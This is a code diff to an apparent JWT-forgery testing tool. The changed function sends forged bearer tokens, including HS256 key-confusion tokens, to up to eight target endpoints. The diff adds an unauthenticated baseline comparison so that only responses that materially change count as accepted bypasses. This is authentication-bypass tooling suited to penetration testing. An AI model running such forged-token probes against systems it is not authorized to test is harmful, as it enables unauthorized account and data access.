@@ -170,22 +170,45 @@ async def forge_and_test(client: HttpClient, target: str,
             tokens_to_try.append((f"HS256-confusion/{pk_path.name}/{claims.get('sub','?')}", hs))
 
     # 4) Test each token against each endpoint (Authorization Bearer + cookie)
+    # First, get a BASELINE response (no token) for each endpoint so we can tell
+    # if the token actually changed behavior. Without this, JWT bypass attempts
+    # against unauthenticated pages get marked as "accepted" simply because
+    # the page returns 200.
+    baselines: dict[str, tuple[int, int]] = {}
+    for ep in test_endpoints[:8]:
+        b = await client._request(ep)
+        baselines[ep] = (b.status, len(b.content))
+
     for label, tok in tokens_to_try[:40]:
         for ep in test_endpoints[:8]:
             for hdr_name in ("Authorization",):
                 value = f"Bearer {tok}"
                 r = await client._request(ep, extra_headers={hdr_name: value})
+                base_status, base_size = baselines.get(ep, (0, 0))
+                # Only count as "accepted" when:
+                #  1. response is OK
+                #  2. response is bigger than 100B (not a redirect/error page)
+                #  3. no login/unauth marker in body
+                #  4. the response materially differs from the unauth baseline
+                #     (status changed OR body size changed by ≥10%)
+                size_delta = abs(len(r.content) - base_size)
+                size_changed = size_delta > max(50, base_size * 0.1)
+                status_changed = r.status != base_status
                 accepted = (r.ok and len(r.content) > 100
                             and b"login" not in r.content[:1024].lower()
-                            and b"unauth" not in r.content[:1024].lower())
+                            and b"unauth" not in r.content[:1024].lower()
+                            and (status_changed or size_changed))
                 report.forged_token_tests.append({
                     "label": label, "endpoint": ep, "header": hdr_name,
                     "status": r.status, "size": len(r.content),
+                    "baseline_status": base_status, "baseline_size": base_size,
                     "accepted": accepted,
                 })
                 if accepted:
                     report.findings.append(CryptoFinding(
                         technique=label, endpoint=ep,
-                        detail=f"forged token accepted (HTTP {r.status}, {len(r.content)} bytes)",
+                        detail=(f"forged token altered response: "
+                                f"baseline {base_status}/{base_size}B → "
+                                f"{r.status}/{len(r.content)}B"),
                     ))
     return report
